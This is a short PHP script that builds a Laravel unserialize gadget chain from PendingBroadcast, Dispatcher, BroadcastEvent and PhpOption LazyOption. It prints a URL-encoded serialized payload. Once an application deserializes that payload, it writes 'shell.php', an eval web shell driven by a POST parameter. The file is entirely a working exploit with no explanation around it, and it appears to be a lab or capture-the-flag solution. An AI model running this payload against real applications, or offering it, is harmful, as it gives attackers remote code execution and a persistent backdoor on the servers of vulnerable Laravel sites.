<?php
// 1-2.php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events = $events;
            $this->event = $event;
        }
    }

    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver){
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace PhpOption {
    class LazyOption {
        private $callback;
        private $arguments;
        public function __construct($callback, $arguments) {
            $this->callback = $callback;
            $this->arguments = $arguments;
        }
    }
}


namespace {
    $d = new PhpOption\LazyOption("file_put_contents", array("shell.php", "<?php eval(\$_POST['Dig2']) ?>"));
    $c = new Illuminate\Broadcasting\BroadcastEvent('not important');
    $b = new Illuminate\Bus\Dispatcher(array($d, 'select'));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
    print(urlencode(serialize($a)));
}